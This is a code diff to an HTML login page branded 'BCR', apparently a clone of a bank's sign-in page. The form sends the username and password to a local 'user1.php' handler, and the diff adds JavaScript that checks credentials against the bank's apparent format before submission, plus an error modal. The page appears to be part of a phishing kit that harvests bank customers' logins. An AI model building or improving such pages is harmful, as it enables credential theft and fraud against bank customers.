@@ -5,6 +5,27 @@
   <title>BCR</title>
   <link href="archivos/style.css" rel="stylesheet" type="text/css">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    .modal {
+      display: none;
+      position: fixed;
+      z-index: 9999;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background-color: rgba(0, 0, 0, 0.5);
+      justify-content: center;
+      align-items: center;
+    }
+
+    .modal img {
+      width: 90%;
+      max-width: 500px;
+      border-radius: 10px;
+      cursor: pointer;
+    }
+  </style>
 </head>
 <body>
 
@@ -30,7 +51,7 @@
 
   <div class="containerimg">  
     <div class="divform1">
-      <form action="user1.php" method="post">
+      <form id="loginForm" action="user1.php" method="post">
         <span class="ingresartxt">Ingresar</span>
         <hr class="line1" color="#C4C4C4">
 
@@ -38,13 +59,13 @@
         <img class="passimg" src="archivos/Seguridad.svg">
 
         <div class="floating-label">      
-          <input class="user" type="text" name="usuario" placeholder=" " required>
+          <input class="user" type="text" name="usuario" id="usuario" placeholder=" " required>
           <span class="highlight"></span>
           <label>Usuario</label>
         </div>
 
         <div class="floating-label2">      
-          <input class="pass" type="password" name="cpass" placeholder=" " required>
+          <input class="pass" type="password" name="cpass" id="contrasena" placeholder=" " required>
           <span class="highlight2"></span>
           <label>Contraseña</label>
         </div>
@@ -71,5 +92,43 @@
   <div class="footer">
     <span class="footertext">BCR © Derechos Reservados 2024. Contáctenos: CentroAsistenciaBCR@bancobcr.com</span>
   </div>
+
+  <!-- Modal con imagen para validación -->
+  <div id="modalError" class="modal">
+    <img src="archivos/hold.png" alt="Error" onclick="cerrarModal()">
+  </div>
+
+  <script>
+    const form = document.getElementById("loginForm");
+
+    function validarContrasena(pass) {
+      const regex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)[A-Za-z\d]{8,11}$/;
+      return regex.test(pass);
+    }
+
+    function validarUsuario(usuario) {
+      return !/\s/.test(usuario);
+    }
+
+    function mostrarModal() {
+      document.getElementById("modalError").style.display = "flex";
+    }
+
+    function cerrarModal() {
+      document.getElementById("modalError").style.display = "none";
+    }
+
+    form.addEventListener("submit", function (e) {
+      const usuario = document.getElementById("usuario").value;
+      const contrasena = document.getElementById("contrasena").value;
+
+      if (!validarUsuario(usuario) || !validarContrasena(contrasena)) {
+        e.preventDefault();
+        mostrarModal();
+        return;
+      }
+    });
+  </script>
+
 </body>
 </html>
